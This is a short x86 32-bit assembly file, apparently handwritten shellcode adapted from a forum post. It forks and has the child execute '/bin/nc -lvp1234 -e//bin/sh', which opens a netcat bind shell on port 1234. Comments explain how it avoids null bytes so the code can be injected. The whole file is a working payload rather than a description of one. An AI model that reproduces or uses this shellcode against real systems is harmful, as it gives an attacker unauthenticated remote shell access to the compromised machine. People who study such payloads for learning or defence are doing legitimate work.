;adapted from: https://www.linuxquestions.org/questions/programming-9/assembly-for-execve-passing-args-896815/#post4440329
;let's try: /bin/nc -lvp1234 -e//bin/sh
;this time with forking and waiting...
[bits 32]

	xor	eax, eax
	inc	eax
	inc	eax		;eax now has value of 2... (SYS_FORK Op Code)
	int	0x80		;fork()
	xor	ebx, ebx	;trickery to avoid generating 0x00 byte sequences
	cmp	eax, ebx	;compare eax with freshly zero'd ebx
	je	child		;check if we're parent or child process
	mov	eax, 0xFFFFFFF8	;new: let's try to wait...
	xor	eax, 0xFFFFFFFF	; (7 -> sys_waitpid)
	int	0x80		;wait()
	inc	ebx		;then exit (EBX should still be zero at this point....)
	mov	eax, ebx	;EAX is now 1
	int	0x80
child:
	xor	eax, eax
	xor	ebx, ebx
	xor	ecx, ecx
	xor	edx, edx	;last argument (NULL)
	xor	esi, esi
	xor	edi, edi

	push	eax
	push	0x636E2F6E	;cn/n
	push	0x69622F2F	;ib//
	mov	ebx, esp	;//bin/nc (arg 0)

	push	eax
	push	0x34333231	;4321
	push	0x70766C2D	;pvl-
	mov	esi, esp	;-lvp1234

	push	eax
	push	0x68732F6E	;hs/n
	push	0x69622F2F	;ib//
	push	word 0x652D	;e-
	mov	edi, esp

	push	eax		;NULL
	push	edi		;NULL, cn/nib//
	push	esi		;NULL, cn/nib//, 4321pvl-
	push	ebx		;NULL, cn/nib// , 4321pvl- , hs/nib//e-
	mov	ecx, esp	;=> { "/bin/nc", "-lvp1234", "-e//bin/sh", 0} ... somehow

	mov	eax, 0xFFFFFFF4	;2's compliment 11
	xor	eax, 0xFFFFFFFF	;xor to get 11
	int	0x80

	xor	eax, eax
	inc	eax
	int	0x80
